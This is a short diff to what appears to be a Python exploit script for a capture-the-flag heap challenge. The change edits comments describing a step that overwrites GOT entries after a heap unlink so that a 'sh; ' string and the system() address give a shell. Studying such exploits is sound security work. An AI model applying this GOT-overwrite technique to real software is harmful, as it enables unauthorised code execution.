@@ -159,7 +159,11 @@ if __name__ == "__main__":
     # [8] overwrite 32 GOT entries
     #
     # after the unlinking, CURRENT_INGREDIENT == 0x804cff8
-    # 'ag' => memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)...")
+    # 'ag' => 
+    #   p = calloc(...)
+    #   fgets(p, ,stdin)
+    #   memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)...")
+    #   free(p)
     #
     raw_input('[8] go?')
     s('a')
